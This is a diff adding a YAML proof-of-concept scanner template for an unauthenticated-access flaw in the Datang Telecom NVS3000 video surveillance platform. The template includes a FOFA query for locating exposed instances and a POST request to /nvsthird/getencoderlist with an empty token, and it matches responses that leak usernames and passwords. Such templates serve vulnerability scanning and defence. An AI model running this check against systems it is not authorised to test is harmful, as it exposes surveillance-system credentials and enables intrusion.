@@ -1,0 +1,18 @@
+id: poc-yaml-datang-dianxin-nvs3000-getencoderlist-unauthorized-access
+info:
+  name: 大唐电信NVS3000综合视频监控平台 getencoderlist 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: 综合视频监控平台
+  fofa: body="综合视频监控平台" && body="验证码"
+requests:
+- method: POST
+  path: /nvsthird/getencoderlist
+  headers:
+    Content-Type: application/json
+  data: '{"token":"","fromindex":0,"toindex":-1}'
+  expression: status_code == 200 && contains(body,"\"username\":") && contains(body,"\"errormsg\":\"OK\"")
+    && contains(body,"\"password\":") && contains(content_type,"application/json")
+variables: {}
+transport: http
